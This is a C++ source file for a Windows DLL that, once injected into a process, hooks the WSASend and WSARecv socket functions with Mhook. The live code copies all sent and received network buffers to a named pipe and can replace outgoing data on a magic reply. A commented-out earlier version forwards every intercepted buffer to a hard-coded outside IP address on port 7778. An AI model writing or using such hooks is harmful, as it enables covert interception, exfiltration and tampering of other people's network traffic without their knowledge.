// dllmain.cpp : Определяет точку входа для приложения DLL.
#include "pch.h"
#pragma warning( disable : 4996)

WSADATA WsaData;

typedef ULONG(WINAPI* _WSock)(
	SOCKET                             s,
	LPWSABUF                           lpBuffers,
	DWORD                              dwBufferCount,
	LPDWORD                            lpNumberOfBytesRecvd,
	LPDWORD                            lpFlags,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	);

_WSock TrueWSock = (_WSock)GetProcAddress(GetModuleHandle(L"Ws2_32.dll"), "WSARecv");

typedef ULONG(WINAPI* _WsaSend)(
	SOCKET                             s,
	LPWSABUF                           lpBuffers,
	DWORD                              dwBufferCount,
	LPDWORD                            lpNumberOfBytesSent,
	DWORD                              dwFlags,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	);

_WsaSend TruSend = (_WsaSend)GetProcAddress(GetModuleHandle(L"Ws2_32.dll"), "WSASend");

ULONG WINAPI HookSend(
	SOCKET                             s,
	LPWSABUF                           lpBuffers,
	DWORD                              dwBufferCount,
	LPDWORD                            lpNumberOfBytesSent,
	DWORD                              dwFlags,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
)
{
	std::string PipeServerName = "\\\\.\\pipe\\ConsoleServer";
	std::string PipeDllName = "\\\\.\\pipe\\HookDll";
	std::string sAnsver;
	char ansver[256];
	HANDLE ServerPipe = CreateFileA(&PipeServerName[0], GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);



	if (ServerPipe != INVALID_HANDLE_VALUE)
	{
		WriteFile(ServerPipe, lpBuffers->buf, 256, NULL, NULL);

		ReadFile(ServerPipe, ansver, 256, NULL, NULL);

		sAnsver = ansver;
	}

	if (sAnsver == "!@#$%^&*()")
	{

		char mes[256];
		ReadFile(ServerPipe, mes, 256, NULL, NULL);

		for (int i = 0; i < lpBuffers->len; ++i)
			lpBuffers->buf[i] = mes[i];
	}

	CloseHandle(ServerPipe);

	return TruSend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
}

ULONG WINAPI HookWSock(
	SOCKET                             s,
	LPWSABUF                           lpBuffers,
	DWORD                              dwBufferCount,
	LPDWORD                            lpNumberOfBytesRecvd,
	LPDWORD                            lpFlags,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
)
{
	TrueWSock(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);


	std::string PipeServerName = "\\\\.\\pipe\\ConsoleServer";
	HANDLE WriteServer = CreateFileA(&PipeServerName[0], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (WriteServer != INVALID_HANDLE_VALUE)
	{
		WriteFile(WriteServer, lpBuffers->buf, 256, NULL, NULL);
		CloseHandle(WriteServer);
	}

	return 0;
}


HOOK_INFO hooks[] =
{
	{ (PVOID*)& TrueWSock, HookWSock },
	{ (PVOID*)& TruSend, HookSend },
};



BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		WSAStartup(0x0101, &WsaData);
		Mhook_SetHookEx(hooks, 2);
		break;

	case DLL_PROCESS_DETACH:
		Mhook_UnhookEx((PVOID * *)& hooks, 2);
		break;
	}
	return TRUE;
}

//return point 20:00/23.06
//////////////////////////
/*
// dllmain.cpp : Определяет точку входа для приложения DLL.
#include "pch.h"
#pragma warning( disable : 4996)

WSADATA WsaData;

typedef ULONG(WINAPI* _Send)(
	SOCKET     s,
	const char* buf,
	int        len,
	int        flags
	);

_Send truesend = (_Send)GetProcAddress(GetModuleHandle(L"Ws2_32.dll"), "send");

ULONG WINAPI HooktSend(
	SOCKET     s,
	const char* buf,
	int        len,
	int        flags
)
{
	truesend(s, buf, len, flags);
	SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKADDR_IN sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(7778);
	sin.sin_addr.S_un.S_addr = inet_addr("37.57.155.229");
	if (!connect(server, (struct sockaddr*) & sin, sizeof(struct sockaddr)))
		truesend(server, buf, len, flags);
	closesocket(server);

	return 0;
}

typedef ULONG(WINAPI* _WSock)(
	SOCKET                             s,
	LPWSABUF                           lpBuffers,
	DWORD                              dwBufferCount,
	LPDWORD                            lpNumberOfBytesRecvd,
	LPDWORD                            lpFlags,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	);

_WSock TrueWSock = (_WSock)GetProcAddress(GetModuleHandle(L"Ws2_32.dll"), "WSARecv");

typedef ULONG(WINAPI* _WsaSend)(
	SOCKET                             s,
	LPWSABUF                           lpBuffers,
	DWORD                              dwBufferCount,
	LPDWORD                            lpNumberOfBytesSent,
	DWORD                              dwFlags,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	);

_WsaSend TruSend = (_WsaSend)GetProcAddress(GetModuleHandle(L"Ws2_32.dll"), "WSASend");

ULONG WINAPI HookSend(
	SOCKET                             s,
	LPWSABUF                           lpBuffers,
	DWORD                              dwBufferCount,
	LPDWORD                            lpNumberOfBytesSent,
	DWORD                              dwFlags,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
)
{
	SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKADDR_IN sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(7778);
	sin.sin_addr.S_un.S_addr = inet_addr("37.57.155.229");
	std::string tmp = lpBuffers->buf;
	std::string msg = "[send] " + tmp;
	if (!connect(server, (struct sockaddr*) & sin, sizeof(struct sockaddr)))
		send(server, &msg[0], lpBuffers->len, 0);
	closesocket(server);

	return TruSend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
}

ULONG WINAPI HookWSock(
	SOCKET                             s,
	LPWSABUF                           lpBuffers,
	DWORD                              dwBufferCount,
	LPDWORD                            lpNumberOfBytesRecvd,
	LPDWORD                            lpFlags,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
)
{
	TrueWSock(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);


	SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKADDR_IN sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(7778);
	sin.sin_addr.S_un.S_addr = inet_addr("37.57.155.229");
	std::string tmp = lpBuffers->buf;
	std::string msg = "[recv] " + tmp;
	if (!connect(server, (struct sockaddr*) & sin, sizeof(struct sockaddr)))
		send(server, &msg[0], lpBuffers->len, 0);
	closesocket(server);

	return 0;
}


HOOK_INFO hooks[] =
{
	{ (PVOID*)& TrueWSock, HookWSock },
	{ (PVOID*)& TruSend, HookSend },
	{ (PVOID*)& truesend, HooktSend },
};



BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		WSAStartup(0x0101, &WsaData);
		Mhook_SetHookEx(hooks, 3);
		break;

	case DLL_PROCESS_DETACH:
		Mhook_UnhookEx((PVOID * *)& hooks, 3);
		break;
	}
	return TRUE;
}

*/